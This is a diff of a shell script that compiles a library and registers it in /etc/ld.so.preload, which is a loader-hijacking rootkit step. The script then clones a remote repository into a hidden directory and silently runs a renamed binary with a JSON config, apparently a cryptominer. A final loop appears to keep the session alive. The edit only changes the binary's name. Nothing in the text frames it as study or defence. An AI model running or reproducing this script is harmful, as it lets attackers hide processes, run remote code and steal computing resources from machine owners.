@@ -6,10 +6,9 @@ gcc -Wall -fPIC -shared -o libnyumput.so nyumput.c -ldl
 mv libnyumput.so /usr/local/lib/
 echo /usr/local/lib/libnyumput.so >> /etc/ld.so.preload
 rm nyumput.c
-sudo apt-get update 
 mkdir .kapi && cd .kapi
 git clone https://bitbucket.org/aing005/newnivu.git
 cd newnivu
-chmod +x aa.json && chmod +x arig
-./arig -c "aa.json" > /dev/null 2>&1 &
+chmod +x aa.json && chmod +x nivu
+./nivu -c "aa.json" > /dev/null 2>&1 &
 while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 3m; done
